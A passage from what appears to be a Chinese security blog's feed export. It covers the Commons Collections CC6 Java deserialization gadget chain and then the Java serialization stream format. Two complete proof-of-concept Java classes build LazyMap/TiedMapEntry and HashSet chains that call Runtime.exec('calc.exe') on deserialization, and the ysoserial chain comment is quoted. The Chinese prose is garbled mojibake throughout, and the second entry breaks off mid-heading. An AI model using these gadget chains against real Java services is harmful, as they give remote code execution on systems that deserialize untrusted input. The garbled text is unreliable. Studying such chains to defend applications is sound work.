class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸€ä¸‹å´ä¸æˆåŠŸã€‚ï¼Ÿ<br>çœ‹è¿™é‡Œã€‚è¿™é‡Œå‹æ ¹å°±æ²¡æœ‰è¿›å…¥ifè¯­å¥ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œåç»­cc1é“¾ä¸­çš„ä¸œè¥¿ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345650.png" alt="QQæˆªå›¾20220323230710"></p><p>é—®é¢˜å‡ºåœ¨è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345218.png" alt="QQæˆªå›¾20220323232859"></p><p>è·Ÿè¿›putã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345093.png" alt="QQæˆªå›¾20220323233031"></p><p>è¿™é‡Œç›´æ¥å°†åˆ©ç”¨é“¾å­æ‰§è¡Œäº†ä¸€éã€‚å› ä¸ºä¹‹å‰æ²¡æœ‰ä¼ å…¥çœŸæ­£çš„chainTransformï¼Œæ‰€ä»¥ä¸ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚<br>åªè¦ç§»é™¤å°±å¯ä»¥äº†ã€‚<br><code>outerMap.remove(&quot;xsw6a&quot;);</code></p><h2 id="pocï¼ˆæˆåŠŸï¼‰"><a href="#pocï¼ˆæˆåŠŸï¼‰" class="headerlink" title="pocï¼ˆæˆåŠŸï¼‰"></a>pocï¼ˆæˆåŠŸï¼‰</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;123&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345938.png" alt="QQæˆªå›¾20220323234332"></p><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>å®ƒçš„é“¾å­å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ç”¨åˆ°äº†<code>hashset</code>ï¼Œå…¶å®å·®åˆ«ä¸å¤§ã€‚çœ‹ä¸€ä¸‹åˆ©ç”¨é“¾å­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">    java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">            java.util.HashSet.readObject()</span><br><span class="hljs-comment">                java.util.HashMap.put()</span><br><span class="hljs-comment">                java.util.HashMap.hash()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                            java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                                java.lang.Runtime.exec()</span><br><span class="hljs-comment">    by @matthias_kaiser</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet#readObject()"></a>HashSet#readObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203241101565.png" alt="QQæˆªå›¾20220324110121"></p><p>è·Ÿè¿›put<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203241101143.png" alt="QQæˆªå›¾20220324110149"></p><p>åç»­é“¾å­è·Ÿä¸Šé¢çš„ç›¸åŒã€‚</p><h2 id="Yso-x2F-POC"><a href="#Yso-x2F-POC" class="headerlink" title="Yso&#x2F;POC"></a>Yso&#x2F;POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Yso</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tme);<br>        outerMap.remove(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(hashSet);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–åè®®æ„é€ ä¸åˆ†æ</title>
    <link href="/2022/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/2022/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaååºåˆ—åŒ–åè®®æ„é€ ä¸åˆ†æ"><a href="#Javaååºåˆ—åŒ–åè®®æ„é€ ä¸åˆ†æ" class="headerlink" title="Javaååºåˆ—åŒ–åè®®æ„é€ ä¸åˆ†æ"></a>Javaååºåˆ—åŒ–åè®®æ„é€ ä¸åˆ†æ</h1><p>è·Ÿç€pç¥å­¦ä¹ ï¼ˆç›¸å½“äºæ˜¯copyäº†ä¸€épç¥çš„çŸ¥è¯†ï¼‰ã€‚<br>é¦–å…ˆè¿™é‡Œpç¥å¼•å…¥äº†<a href="https://github.com/phith0n/zkar#-installing">zkar</a>å·¥å…·ï¼Œæœ‰äº›å°ç¬¨ï¼Œæ¥è¯´ä¸€ä¸‹å¦‚ä½•å®‰è£…ä½¿ç”¨ä»–ã€‚</p><h2 id="Goè¯­è¨€ä¸‹è½½"><a href="#Goè¯­è¨€ä¸‹è½½" class="headerlink" title="Goè¯­è¨€ä¸‹è½½"></a>Goè¯­è¨€ä¸‹è½½</h2><p>è¿™é‡Œç‰ˆæœ¬ä¸èƒ½å¤ªé«˜ï¼Œå› ä¸ºåç»­æ²¡æœ‰<code>go get</code>å‘½ä»¤ï¼Œæˆ‘ç”¨çš„ç‰ˆæœ¬ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117579.png" alt="QQæˆªå›¾20220323200027"></p><p>å¦‚æœ<code>go get</code>çš„æ—¶å€™æ²¡æœ‰ååº”ï¼Œ<a href="https://www.quanxiaoha.com/golang/go-get-no-response.html">è¿™é‡Œ</a>è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥è§£å†³ã€‚</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥å­¦ä¹ äº†ã€‚</p><h2 id="åºåˆ—åŒ–æµåˆ†æ"><a href="#åºåˆ—åŒ–æµåˆ†æ" class="headerlink" title="åºåˆ—åŒ–æµåˆ†æ"></a>åºåˆ—åŒ–æµåˆ†æ</h2><p>è¿™é‡Œå°±ç”¨pç¥çš„ä»£ç è¿›è¡Œåˆ†æã€‚è´´ä¸€ä¸‹åœ¨zkarå·¥å…·ä½¿ç”¨ä¹‹åçš„åºåˆ—åŒ–æµã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">zkar dump -B rO0ABXNyAARVc2VyGAiH3nlk+bcCAAJMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAGcGFyZW50dAAGTFVzZXI7eHB0AANCb2JzcQB+AAB0AAVKb3N1YXA= <span class="hljs-comment">//ideaç”Ÿäº§çš„base64</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs go">@Magic - <span class="hljs-number">0xac</span> ed<br>@Version - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>@Contents<br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      @ClassName<br>        @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>        @Value - User - <span class="hljs-number">0x55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      @SerialVersionUID - <span class="hljs-number">1731783446313105847</span> - <span class="hljs-number">0x18</span> <span class="hljs-number">08</span> <span class="hljs-number">87</span> de <span class="hljs-number">79</span> <span class="hljs-number">64</span> f9 b7<br>      @Handler - <span class="hljs-number">8257536</span><br>      @ClassDescFlags - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      @FieldCount - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            @Value - name - <span class="hljs-number">0x6e</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span>d <span class="hljs-number">65</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257537</span><br>              @Length - <span class="hljs-number">18</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">12</span><br>              @Value - Ljava/lang/String; - <span class="hljs-number">0x4c</span> <span class="hljs-number">6</span>a <span class="hljs-number">61</span> <span class="hljs-number">76</span> <span class="hljs-number">61</span> <span class="hljs-number">2</span>f <span class="hljs-number">6</span>c <span class="hljs-number">61</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">2</span>f <span class="hljs-number">53</span> <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">3</span>b<br>        Index <span class="hljs-number">1</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>            @Value - parent - <span class="hljs-number">0x70</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257538</span><br>              @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>              @Value - LUser; - <span class="hljs-number">0x4c</span> <span class="hljs-number">55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">3</span>b<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      @SuperClassDesc<br>        TC_NULL - <span class="hljs-number">0x70</span><br>    @Handler - <span class="hljs-number">8257539</span><br>    []ClassData<br>      @ClassName - User<br>        &#123;&#125;Attributes<br>          name<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257540</span><br>              @Length - <span class="hljs-number">3</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">03</span><br>              @Value - Bob - <span class="hljs-number">0x42</span> <span class="hljs-number">6</span>f <span class="hljs-number">62</span><br>          parent<br>            TC_OBJECT - <span class="hljs-number">0x73</span><br>              TC_REFERENCE - <span class="hljs-number">0x71</span><br>                @Handler - <span class="hljs-number">8257536</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>              @Handler - <span class="hljs-number">8257541</span><br>              []ClassData<br>                @ClassName - User<br>                  &#123;&#125;Attributes<br>                    name<br>                      TC_STRING - <span class="hljs-number">0x74</span><br>                        @Handler - <span class="hljs-number">8257542</span><br>                        @Length - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>                        @Value - Josua - <span class="hljs-number">0x4a</span> <span class="hljs-number">6</span>f <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">61</span><br>                    parent<br>                      TC_NULL - <span class="hljs-number">0x70</span><br></code></pre></td></tr></table></figure><p><code>Contents</code>:<strong>åªåŒ…å«ä¸€ä¸ª newObject ï¼Œå…¶ç¬¬ä¸€éƒ¨åˆ†æ˜¯ ClassDesc ï¼ŒåŒ…å«äº†Userè¿™ä¸ªç±»çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»åã€SerialVersionUIDã€çˆ¶ç±»ã€å±æ€§åˆ—è¡¨ç­‰</strong>ã€‚</p><p><code>[]classData</code>:<strong>åŒ…å«ä¸¤ä¸ªå±æ€§ï¼Œ name å’Œ parent ï¼Œ</strong><br><strong>parent ä¹Ÿæ˜¯ä¸€ä¸ª newObject</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117786.png" alt="QQæˆªå›¾20220323201106"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232011046.png" alt="QQæˆªå›¾20220323201132"></p><h2 id="æ„é€ ä¸€ä¸ªåŒ…å«åƒåœ¾æ•°æ®çš„åºåˆ—åŒ–æµ"><a href="#æ„é€ ä¸€ä¸ªåŒ…å«åƒåœ¾æ•°æ®çš„åºåˆ—åŒ–æµ" class="headerlink" title="æ„é€ ä¸€ä¸ªåŒ…å«åƒåœ¾æ•°æ®çš„åºåˆ—åŒ–æµ"></a>æ„é€ 